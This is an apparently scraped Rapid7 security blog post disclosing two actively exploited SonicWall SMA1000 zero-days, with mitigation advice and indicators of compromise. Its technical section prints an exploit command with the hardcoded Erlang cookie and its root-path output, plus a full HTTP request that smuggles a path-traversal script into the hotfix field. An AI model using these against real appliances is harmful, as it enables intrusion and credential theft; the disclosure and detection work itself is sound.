---
schema_version: "1.0.0"
document_id: "49bdf5ce732d9c9d5f5b0012aef0d675e4ce95382a32a8b63261a5deb02b6590"
company_key: "rapid7-inc-common-stock"
company: "Rapid7 Inc."
source_id: "rapid7-inc-common-stock-rss-ea5a9037191f"
canonical_url: "https://www.rapid7.com/blog/post/etr-rapid7-mdr-team-discovers-new-sonicwall-sma1000-zero-days-being-actively-exploited-cve-2026-15409-cve-2026-15410"
published_at: "2026-07-15T16:19:26+00:00"
first_seen_at: "2026-07-20T23:19:41.599179+00:00"
fetched_at: "2026-07-28T21:08:37.946927+00:00"
content_hash: "sha256:ad494f965c1be6ef931659a8b67a497a5f3664562240b7c4aa7cb8ef237e3f99"
---

# Rapid7 MDR Team Discovers New SonicWall SMA1000 Zero Days being Actively Exploited (CVE-2026-15409, CVE-2026-15410)

## Overview


On July 14, 2026, SonicWall


[published](https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0008) a security advisory addressing two vulnerabilities affecting SMA1000 Series remote access appliances, including the critical server-side request forgery (SSRF) vulnerability


[CVE-2026-15409](https://nvd.nist.gov/vuln/detail/CVE-2026-15409) (CVSS 10.0) and the high-severity code injection vulnerability


[CVE-2026-15410](https://nvd.nist.gov/vuln/detail/CVE-2026-15410) . The advisory urges customers to immediately apply the latest platform hotfix releases.


Successful exploitation of CVE-2026-15409 permits an unauthenticated attacker to open a websocket-based tunnel to arbitrary localhost-only services, while CVE-2026-15410 is a local privilege escalation that permits an attacker with access to an internal service listening on port 8188 on localhost to execute arbitrary operating system commands as root via a malicious path traversal-based


remove_hotfix


workflow.


Both vulnerabilities are being actively exploited in the wild. Prior to SonicWall’s official vulnerability disclosure, Rapid7’s Managed Detection and Response team observed active, targeted zero-day exploitation of internet-facing SMA 1000-series appliances. In the SonicWall advisory, exploitation in the wild was


[noted](https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0008#EITW) , and both


[CVE-2026-15409](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-15409) and


[CVE-2026-15410](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-15410) have been added to CISA's Known Exploited Vulnerabilities (


[KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) ) catalog. Given the confirmed exploitation activity and the critical unauthenticated impact of the vulnerabilities, organizations should prioritize remediation of SMA1000 appliances on an emergency basis.


Affected products include SonicWall SMA1000 Series models 6210, 7210, and 8200v running:


-


12.4.3-03245


-


12.4.3-03387


-


12.4.3-03434 (platform-hotfix)


-


12.5.0-02283


-


12.5.0-02624


-


12.5.0-02800 (platform-hotfix)


These vulnerabilities do not affect SSL VPN functionality on SonicWall firewalls or the SMA 100 Series product line.


## Technical overview


The primary vulnerability is in a websocket proxy feature, accessed via the path /wsproxy on the affected “SonicWall WorkPlace” application (served on port 443 by default). This feature permits a netcat-like TCP tunnel to arbitrary hosts and ports, which are provided by the user in URL parameters. By provided host values that point to localhost, the attacker can access local SonicWall appliance system services behind the firewall to send and receive arbitrary TCP traffic to and from them. This is the first-stage vulnerability, CVE-2026-15409, that Rapid7 MDR analysts are seeing attackers exploit in the wild. With this capability, an attacker can reach and exploit less-hardened services running on the appliance, such as the Erlang application on localhost:1050 or the ctrl-service application on localhost:8188.


We developed an exploit targeting the Erlang process listening on localhost:1050 for remote code execution. Note that the provided cookie value is hardcoded for the Erlang process, based on our testing, so authentication is not required to establish code execution.


```text
# python3 cve-2026-15409.py --ws-url 'wss://192.168.1.46/wsproxy?bmID=-3389c1b25ccd&serviceType=SSH&host=0.0.0.0&port=1050' --ws-user-agent 'SMA Connect Agent' --ws-insecure-tls --cookie 10ecad5b446e86864832904cd439b6b70262 --exec 'whoami && id && pwd && hostname'
Authenticated to  [email protected]
Peer flags: 0xd07df7fbd
Peer creation: 1784069352
RPC os:cmd/1 => couchdb
uid=1010(couchdb) gid=1(daemon) groups=1(daemon)
/opt/couchdb
SMAAppliance.sma
```


With code execution established, the attacker can escalate to root on the appliance by exploiting CVE-2026-15410, which is a path traversal in the


remove_hotfix


workflow of ctrl-service. This can be performed via the web console or by hitting port 8188 on the device. The attacker provides a hotfix value containing a path traversal sequence to a malicious script, such as


../../../../var/tmp/privesc


. The system executes the script as root and (typically) reboots the appliance immediately after.


An example malicious request achieving privilege escalation by leveraging this from the web panel is depicted below:


```text
POST /rollbackConfirm.action HTTP/1.1
Host: 192.168.181.46:8443
Cookie: EXTRAWEB_REFERER=%252F; JSESSIONID=node01bcg1tbiy6qi7s97xsoa42lhp8.node0
Content-Length: 134
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="24", "Chromium";v="152"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Origin: https://192.168.181.46:8443
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.181.46:8443/rollbackConfirm.action
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive


csrfToken=GFEJUCQBUZOLUCCOO3YBA8G30ZE9VKDP&command=rollback&rollbackUpgradeTime=&hotfix=../../../../../tmp/1234.sh&rollbackHotfixTime=
```


If the provided hotfix file does not exist, a reboot does not occur. If the provided file exists, the system reboots after it chmods and executes the file. Below is a system monitor (pspy) depicting output of this occurring during exploitation:


```text
2026/07/09 23:21:00 CMD: UID=0     PID=10355  | chmod +x /var/lib/aventail/avp/rollback/../../../../../tmp/1234.sh
2026/07/09 23:21:00 CMD: UID=0     PID=10355  | /bin/bash /var/lib/aventail/avp/rollback/../../../../../tmp/1234.sh --unattended
2026/07/09 23:21:00 CMD: UID=0     PID=10361  | /usr/bin/python3 /usr/local/ctrl-service/bin/ctrl-service.py
[...]
2026/07/09 23:21:22 CMD: UID=0     PID=11124  | shutdown -r now
```


A Python proof-of-concept for CVE-2026-15409 is available


[here](https://github.com/remmons-r7/rapid7-CVE-2026-15409) ; a Metasploit module for the chain is in development.


## Mitigation guidance


Organizations operating SonicWall SMA1000 appliances should


**immediately upgrade**


to the latest platform hotfix releases.


Fixed versions are:


Product


Fixed Version


SMA1000 Series (6210, 7210, 8200v)


12.4.3-03453 (platform-hotfix) or later


SMA1000 Series (6210, 7210, 8200v)


12.5.0-02835 (platform-hotfix) or later


There are


**no workarounds**


available.


Because active exploitation has been confirmed, organizations should not rely solely on patching. SonicWall additionally recommends:


-


Performing a thorough forensic review for indicators of compromise.


-


Re-imaging physical appliances or redeploying virtual appliances if compromise is identified.


-


Changing user and administrator passwords.


-


Resetting TOTP tokens following confirmed compromise.


Customers should consult the SonicWall security advisory for the latest remediation guidance and platform hotfix availability.


## Observed exploitation


Prior to SonicWall’s official vulnerability disclosure, our Managed Detection and Response team observed active, targeted exploitation of internet-facing SMA 1000-series appliances. Threat actors were primarily leveraging the perimeter appliance as a stealthy initial access vector, executing commands on the operating system by bypassing traditional input validation controls. Once they established a foothold on the appliance, the actors systematically extracted high-value credentials, active session databases, and Time-Based One-Time Password (TOTP) multi-factor authentication (MFA) seed configurations. This local harvesting was designed to ensure long-term, persistent access that could survive standard network-level remediations.


With these harvested resources, the threat actors quickly shifted to lateral movement, pivoting from the compromised appliance directly into the internal corporate network. Specifically, we observed a sequence of anomalous, VPN-less Active Directory authentications targeting core domain controllers. These authentications originated directly from the appliance’s internal IP address, using atypical, non-corporate workstation client names (such as kali or other non-inventory hostnames) under the context of the appliance’s integrated LDAP service account. This unique behavior of direct, machine-level lateral movement with no corresponding active VPN tunnel confirmed that the appliance itself had been fully compromised and was acting as an unmonitored backdoor into the corporate directory infrastructure.


## Artifacts or evidence sources and IOCs


Rapid7 recommends reviewing appliance logs for evidence of active exploitation, including the following characteristic behaviors and specific log indicators:


### Characteristic behaviors


**Websocket exploit IOC log patterns:**


extraweb_access.log


entries containing the strings ("GET" AND "wsproxy" AND "=-3389" AND “ 101 “) indicate interactions with the niche affected service. If suspicious host parameter values such as “localhost” or “::ffff:127.0.0.1” are present, that’s indicative of likely exploitation of CVE-2026-15409. Note that “serviceType=SSH” was used in our published materials, but options such as “serviceType=TELNET” are viable alternatives.


**Hotfix removal exploit IOC log patterns:**


The


ctrl-service.log


shows the hotfix-removal utility (


/usr/local/bin/remove_hotfix


) being invoked with traversal sequences pointing to attacker-staged shell script payloads (e.g., ../../../../../../tmp/sma1000_5c47.sh). This is indicative of successful exploitation of CVE-2026-15410.


**Internet-facing probing:**


Enumeration of the SMA portal, including repeated requests to /auth1.html, path-traversal attempts, and generic file/enumeration requests (e.g.,


/.env


,


/api/sonicos/is-sslvpn-enabled


).


**Authentication activity:**


Authentication-API activity against


/__api__/logon/<session-id>/authenticate


.


**Sensitive path access:**


Access to sensitive appliance paths such as


/tmp/temp.db*


, consistent with theft of stored session data.


**AD/Service Account Compromise:**


NTLM logons (Windows Event ID 4624, logon type 3) into internal domain controllers sourced from the appliance's internal IP address, using attacker-controlled workstation names (e.g., kali) without a corresponding VPN session.


**extraweb_access.log:**


Requests to


/__api__/login


or


/__api__/logou


t returning HTTP 200, and requests to


/wsproxy


containing suspicious host parameters returning HTTP 101.


### Configuration artifacts


/var/lib/unit/conf.json


containing routes for


/__api__/login


or


/__api__/logout


, which are not present in legitimate configurations.


### Atomic Indicators


**F.N.S Holdings Limited (ASN - 206092):**


The threat actor(s) utilized varying IP addresses, but they belonged to the VPN hosting provider FNS Holdings Limited. Limit or block access to FNS Holdings Limited if there is no business need. For reference, the IP addresses we observed were:


-


45.131.194.0/24


-


45.146.54.0/24


-


63.135.161.0/24


-


173.239.211.0/24


-


193.37.32\[.\]179


-


193.37.32\[.\]214


-


216.73.163\[.\]151


-


216.73.163\[.\]158


**Attacker Asset Names:**


-


DESKTOP-KRLUI3J


-


DESKTOP-IC3C80F


-


DESKTOP-5P0TSCP


-


KALI


-


localhost


If any indicators of compromise are identified, organizations should treat the appliance as compromised and follow SonicWall’s recovery guidance.


## Rapid7 customers


Organizations should prioritize identifying all internet-facing SonicWall SMA1000 appliances and determine whether affected software versions remain deployed. Given SonicWall’s and Rapid7’s confirmation of active exploitation, exposed appliances should be considered high-priority assets for remediation.


Security teams should also review available authentication, web access, and appliance management logs for the indicators published by SonicWall to determine whether follow-up incident response activities are warranted.


### Exposure Command, InsightVM, and Nexpose


Exposure Command, InsightVM, and Nexpose customers will be able to assess exposure to


**CVE-2026-15409**


and


**CVE-2026-15410**


with authenticated vulnerability checks available in the July 15 content release.


## Updates


- **July 15, 2026:**


Initial publication.


- **July 16, 2026:**


Additional IOCs identified and blog section updated with the identified attacker asset names.
